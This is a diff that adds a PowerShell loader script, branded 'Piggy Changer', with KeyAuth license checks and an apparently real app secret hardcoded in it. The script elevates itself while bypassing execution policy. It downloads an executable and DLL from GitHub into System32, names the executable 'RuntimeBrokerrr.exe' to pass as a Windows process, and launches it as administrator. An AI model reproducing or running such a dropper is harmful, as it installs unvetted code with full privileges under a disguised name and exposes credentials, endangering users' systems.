@@ -1,0 +1,126 @@
+# ==========================================================
+# XXXX CMD Utility | KeyAuth 1.3 Integrated
+# ==========================================================
+
+Write-Host ""
+Write-Host " WELCOME TO XXXX CMD " -ForegroundColor Cyan
+Write-Host " © 2025 | PIGGY PROJECT " -ForegroundColor Gray
+Write-Host ""
+Write-Host " [1] Install & Run" -ForegroundColor Green
+Write-Host " [2] Clean" -ForegroundColor Yellow
+Write-Host ""
+$choice = Read-Host ">>> Enter your choice (1/2)"
+
+# -----------------------------
+# Check Admin
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "`n[Administrator] Restarting as Administrator..." -ForegroundColor Cyan
+    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# KeyAuth 1.3 Config (เปลี่ยนตรงนี้)
+# -----------------------------
+$KeyAuthApp = @{
+    name       = "Piggy Changer"                  # ชื่อแอปใน KeyAuth
+    ownerid    = "c9bbfSSP40"            # OwnerID ของคุณ
+    secret     = "42ac950133d2a83a894c2a3536ae9f8116564220a29ccbb5e31d7cf22678482b"         # App Secret
+    version    = "1.0"
+}
+
+# -----------------------------
+# Paths
+# -----------------------------
+$system32Path    = "$env:windir\System32"
+$exeDestination  = "$system32Path\RuntimeBrokerrr.exe"
+$dllDestination  = "$system32Path\Guna.UI2.dll"
+$exeUrl          = "https://github.com/ORRYxyz/cccc/raw/main/XXXX.exe"
+$dllUrl          = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
+
+# -----------------------------
+# KeyAuth 1.3 Initialize & Login
+# -----------------------------
+function Initialize-KeyAuth {
+    $global:KeyAuthStatus = Invoke-RestMethod "https://keyauth.win/api/1.3/" -Method Post -Body @{
+        type    = "init"
+        name    = $KeyAuthApp.name
+        ownerid = $KeyAuthApp.ownerid
+        version = $KeyAuthApp.version
+    }
+    if (-not $global:KeyAuthStatus.success) {
+        Write-Host "[Error] KeyAuth init failed: $($global:KeyAuthStatus.message)" -ForegroundColor Red
+        exit
+    }
+    Write-Host "[Success] KeyAuth initialized successfully!" -ForegroundColor Green
+}
+
+function Login-WithLicense {
+    do {
+        $license = Read-Host "`n[Key] Enter License Key"
+        $response = Invoke-RestMethod "https://keyauth.win/api/1.3/" -Method Post -Body @{
+            type     = "license"
+            key      = $license
+            hwid     = (Get-CimInstance Win32_ComputerSystemProduct).UUID
+            name     = $KeyAuthApp.name
+            ownerid  = $KeyAuthApp.ownerid
+            secret   = $KeyAuthApp.secret
+        }
+
+        if ($response.success) {
+            Write-Host "[Success] Login Successful! Welcome back." -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "[Failed] $($response.message)" -ForegroundColor Red
+            $retry = Read-Host "Try again? (y/n)"
+            if ($retry -ne "y") { exit }
+        }
+    } while ($true)
+}
+
+# -----------------------------
+# Option 1 - Install & Run (with KeyAuth 1.3)
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "`n[Lock] KeyAuth 1.3 Authentication" -ForegroundColor Magenta
+    Initialize-KeyAuth
+    Login-WithLicense
+
+    Write-Host "`n[Rocket] Starting installation..." -ForegroundColor Cyan
+    Start-Sleep -Seconds 1
+
+    # Download DLL
+    Write-Host "[Download] Guna.UI2.dll..."
+    Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination -UseBasicParsing -ErrorAction Stop
+    Write-Host "[Success] Guna.UI2.dll downloaded." -ForegroundColor Green
+
+    # Download EXE
+    Write-Host "[Download] Main executable..."
+    $temp = "$env:TEMP\xxxx_temp.exe"
+    Invoke-WebRequest -Uri $exeUrl -OutFile $temp -UseBasicParsing -ErrorAction Stop
+    Move-Item -Path $temp -Destination $exeDestination -Force
+    Write-Host "[Success] Executable downloaded." -ForegroundColor Green
+
+    # Launch
+    Write-Host "[Launch] Starting RuntimeBrokerrr.exe..."
+    Start-Process -FilePath $exeDestination -Verb RunAs
+    Write-Host "[Success] Program launched successfully!" -ForegroundColor Green
+
+    Write-Host "`n[Complete] Everything done." -ForegroundColor Cyan
+}
+
+# -----------------------------
+# Option 2 - Clean
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "`n[Broom] Cleaning..." -ForegroundColor Yellow
+    Stop-Process -Name "RuntimeBrokerrr" -Force -ErrorAction SilentlyContinue
+    if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force; Write-Host "[Trash] Removed RuntimeBrokerrr.exe" -ForegroundColor Green }
+    if (Test-Path $dllDestination) { Remove-Item $dllDestination -Force; Write-Host "[Trash] Removed Guna.UI2.dll" -ForegroundColor Green }
+    Write-Host "`n[Complete] Clean complete!" -ForegroundColor Green
+}
+
+else {
+    Write-Host "`n[Error] Choose 1 or 2 only." -ForegroundColor Red
+}
